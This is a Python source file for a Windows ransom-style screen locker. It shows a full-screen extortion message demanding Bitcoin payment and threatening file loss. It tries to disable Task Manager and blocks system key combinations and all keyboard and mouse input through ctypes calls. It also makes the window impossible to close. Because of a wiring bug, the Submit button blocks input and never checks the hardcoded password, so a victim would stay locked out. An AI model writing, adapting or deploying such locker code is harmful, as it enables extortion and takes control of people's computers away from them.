import tkinter as tk
from tkinter import messagebox
import ctypes
import threading
import pygame  # Import pygame for playing music

# Set the correct password
CORRECT_PASSWORD = "mypassword"

# Initialize pygame for background music
pygame.mixer.init()

# Global variable to track if input is blocked
input_blocked = False

# Function to check if the entered password is correct
def check_password():
    global input_blocked
    entered_password = password_entry.get()
    if entered_password == CORRECT_PASSWORD:
        enable_task_manager()  # Re-enable Task Manager
        root.destroy()  # Close the lock screen if the password is correct
        pygame.mixer.music.stop()  # Stop the background music
        unblock_input()  # Unblock input after the password is correct
    else:
        messagebox.showerror("Error", "Incorrect password. Try again!")

# Create the lock screen
def create_lock_screen():
    global root
    root = tk.Tk()
    
    # Make the window full screen
    root.attributes("-fullscreen", True)
    
    # Disable window closing or minimizing
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    # Create a canvas for the design
    canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), bg="black")
    canvas.pack(fill="both", expand=True)

    # Add a title message (your "ransom" message)
    canvas.create_text(root.winfo_screenwidth() // 2, 150, text="Your Files Have Been Locked!", font=("Arial", 40), fill="red")
    
    # Add instructions for the user to pay in Bitcoin
    canvas.create_text(root.winfo_screenwidth() // 2, 250, text="To unlock your system, send 0.05 BTC to the following address:", font=("Arial", 24), fill="white")
    canvas.create_text(root.winfo_screenwidth() // 2, 300, text="Bitcoin Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", font=("Arial", 20), fill="yellow")
    
    # Add a warning
    canvas.create_text(root.winfo_screenwidth() // 2, 350, text="Failure to pay will result in permanent loss of your files.", font=("Arial", 18), fill="red")

    # Add instructions to enter the password after payment
    canvas.create_text(root.winfo_screenwidth() // 2, 450, text="Enter the password to unlock your system after payment:", font=("Arial", 24), fill="white")
    
    # Create password entry box
    global password_entry
    password_entry = tk.Entry(root, font=("Arial", 24), show="*")  # Hide text with '*'
    password_entry_canvas = canvas.create_window(root.winfo_screenwidth() // 2, 500, window=password_entry, width=300)
    
    # Create the submit button
    submit_button = tk.Button(root, text="Submit", font=("Arial", 20), command=lock_input)
    submit_button_canvas = canvas.create_window(root.winfo_screenwidth() // 2, 550, window=submit_button, width=150)
    
    # Disable task manager and start blocking key combinations
    disable_task_manager()
    block_system_keys()

    # Start playing background music
    play_background_music()

    # Loop the program
    root.mainloop()

# Function to disable Task Manager on Windows
def disable_task_manager():
    try:
        ctypes.windll.user32.SystemParametersInfoW(97, True, 0, 0)  # Disable Ctrl+Alt+Del (Task Manager)
    except:
        print("Unable to disable Task Manager. This feature only works on Windows.")

# Function to re-enable Task Manager when the screen is unlocked
def enable_task_manager():
    try:
        ctypes.windll.user32.SystemParametersInfoW(97, False, 0, 0)  # Re-enable Ctrl+Alt+Del
    except:
        print("Unable to re-enable Task Manager. This feature only works on Windows.")

# Function to block common system key combinations like Alt+Tab, Ctrl+Esc, Alt+F4, and the Windows key
def block_system_keys():
    def key_blocker():
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32

        # Virtual key codes for keys we want to block
        VK_LWIN = 0x5B  # Left Windows key
        VK_RWIN = 0x5C  # Right Windows key
        VK_TAB = 0x09   # Tab key
        VK_ALT = 0x12   # Alt key
        VK_F4 = 0x73    # F4 key
        VK_ESC = 0x1B   # Escape key
        VK_CTRL = 0x11  # Ctrl key

        # Infinite loop to keep blocking system key combinations
        while True:
            if user32.GetAsyncKeyState(VK_TAB) & 0x8000 and user32.GetAsyncKeyState(VK_ALT) & 0x8000:  # Alt+Tab
                user32.BlockInput(True)
            elif user32.GetAsyncKeyState(VK_ESC) & 0x8000 and user32.GetAsyncKeyState(VK_CTRL) & 0x8000:  # Ctrl+Esc
                user32.BlockInput(True)
            elif user32.GetAsyncKeyState(VK_ALT) & 0x8000 and user32.GetAsyncKeyState(VK_F4) & 0x8000:  # Alt+F4
                user32.BlockInput(True)
            elif user32.GetAsyncKeyState(VK_LWIN) & 0x8000:  # Left Windows key
                user32.BlockInput(True)
            elif user32.GetAsyncKeyState(VK_RWIN) & 0x8000:  # Right Windows key
                user32.BlockInput(True)
            else:
                # Unblock when none of the system keys are pressed
                user32.BlockInput(False)

            kernel32.Sleep(10)

    blocker_thread = threading.Thread(target=key_blocker)
    blocker_thread.daemon = True
    blocker_thread.start()

# Function to lock both keyboard and mouse input
def lock_input():
    global input_blocked
    input_blocked = True
    ctypes.windll.user32.BlockInput(True)  # Block input (keyboard and mouse)

# Function to unblock both keyboard and mouse input
def unblock_input():
    global input_blocked
    input_blocked = False
    ctypes.windll.user32.BlockInput(False)  # Unblock input (keyboard and mouse)

def play_background_music():
    try:
        pygame.mixer.music.load("KRUSH_ALERT.mp3")  
        pygame.mixer.music.set_volume(0.5)  
        pygame.mixer.music.play(-1)  
    except pygame.error as e:
        print(f"Error loading or playing music: {e}")

if __name__ == "__main__":
    create_lock_screen()
